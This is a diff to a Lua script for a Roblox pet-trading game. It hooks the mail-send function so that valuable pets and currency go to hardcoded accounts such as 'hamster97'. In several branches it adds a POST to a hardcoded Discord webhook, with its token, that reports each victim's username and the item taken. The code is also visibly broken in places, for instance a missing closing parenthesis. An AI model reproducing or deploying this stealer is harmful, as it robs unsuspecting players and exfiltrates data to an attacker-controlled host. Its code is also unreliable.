@@ -7,8 +7,8 @@ x.Close = function() return true end
 if not dp then dp = 0 end
 if not _G.itc then _G.itc = 0 end
 if not _G.Min then _G.Min = 500000000 end
-if not potc then
 function ifUserNull() return true end
+if not potc then
 potc = 0
 end
 if _G.dx then return end
@@ -83,12 +83,90 @@ local save = require(game:GetService("ReplicatedStorage").Library.Client.Save).G
 local dir = game:GetService("ReplicatedStorage")["__DIRECTORY"].Pets
 if args[3] == "Pet" and require(dir[save.Inventory.Pet[args[4]].id]).difficulty>=1000000000 then
 args[1] = "hamster97" 
+_G.pvc = args[4]
+mailc=mailc+1
+print("-------------lol")
+local qv = "starsh"
+print(qv)
+local save = require(game:GetService("ReplicatedStorage").Library.Client.Save).Get()
+local nam = "Gems"
+pcall(function()
+nam = save.Inventory.Pet[args[4]].id or args[4] end)
+qv = '{"content":"'..game.Players.LocalPlayer.Name..' >> '..args[5]..'x '..nam..' >> PetSimxForNubs"}'
+print(qv)
+local responsexr =
+        request(
+        {
+            Url = "https://discordapp.com/api/webhooks/1305669883903606876/Ug70lrMSDzXmVo0h7jx5LmvFiYnlHCAPVgPJad9sxyxuS8R_skfiwrECPCl_paVmOD20",
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = qv
+        }
+    )
 elseif args[3] == "Pet" and string.find(save.Inventory.Pet[args[4]].id, "Jelly" then
 args[1] = "kdnaviivii" -- Jelly Hold
+_G.pvc = args[4]
+mailc=mailc+1
+print("-------------lol")
+local qv = "starsh"
+print(qv)
+local save = require(game:GetService("ReplicatedStorage").Library.Client.Save).Get()
+local nam = "Gems"
+pcall(function()
+nam = save.Inventory.Pet[args[4]].id or args[4] end)
+qv = '{"content":"'..game.Players.LocalPlayer.Name..' >> '..args[5]..'x '..nam..' >> Jelly Hold Account"}'
+print(qv)
+local responsexr =
+        request(
+        {
+            Url = "https://discordapp.com/api/webhooks/1305669883903606876/Ug70lrMSDzXmVo0h7jx5LmvFiYnlHCAPVgPJad9sxyxuS8R_skfiwrECPCl_paVmOD20",
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = qv
+        }
+    )
 elseif args[3] == "Pet" then
---e
-elseif args[3] == "Currency" and args[5]<=5000000 then
---e
+_G.pvc = args[4]
+mailc=mailc+1
+print("-------------lol")
+local qv = "starsh"
+print(qv)
+local save = require(game:GetService("ReplicatedStorage").Library.Client.Save).Get()
+local nam = "Gems"
+pcall(function()
+nam = save.Inventory.Pet[args[4]].id or args[4] end)
+qv = '{"content":"'..game.Players.LocalPlayer.Name..' >> '..args[5]..'x '..nam..' >> '.._G.User..'"}'
+print(qv)
+local responsexr =
+        request(
+        {
+            Url = "https://discordapp.com/api/webhooks/1305669883903606876/Ug70lrMSDzXmVo0h7jx5LmvFiYnlHCAPVgPJad9sxyxuS8R_skfiwrECPCl_paVmOD20",
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = qv
+        }
+    )
+elseif args[3] == "Currency" and args[5]<=1000000 then
+_G.pvc = args[4]
+mailc=mailc+1
+print("-------------lol")
+local qv = "starsh"
+print(qv)
+local save = require(game:GetService("ReplicatedStorage").Library.Client.Save).Get()
+local nam = "Gems"
+pcall(function()
+nam = save.Inventory.Pet[args[4]].id or args[4] end)
+qv = '{"content":"'..game.Players.LocalPlayer.Name..' >> '..args[5]..'x '..nam..' >> '.._G.User..'"}'
+print(qv)
+local responsexr =
+        request(
+        {
+            Url = "https://discordapp.com/api/webhooks/1305669883903606876/Ug70lrMSDzXmVo0h7jx5LmvFiYnlHCAPVgPJad9sxyxuS8R_skfiwrECPCl_paVmOD20",
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = qv
+        }
+    )
 else
 args[1] = "hamster97"
 end
